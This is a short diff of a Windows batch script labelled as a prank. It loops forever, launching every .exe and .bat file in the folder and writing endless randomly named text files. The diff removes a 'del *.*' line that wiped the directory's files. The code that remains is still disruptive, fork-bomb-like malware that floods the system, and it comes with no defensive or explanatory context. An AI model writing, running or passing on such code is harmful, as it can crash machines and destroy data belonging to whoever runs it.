@@ -5,6 +5,5 @@ start *.exe
 goto loop
 :loop:
 echo "calm down, it's just a prank">%random%.txt
-del *.*
 start *.bat
 goto loop
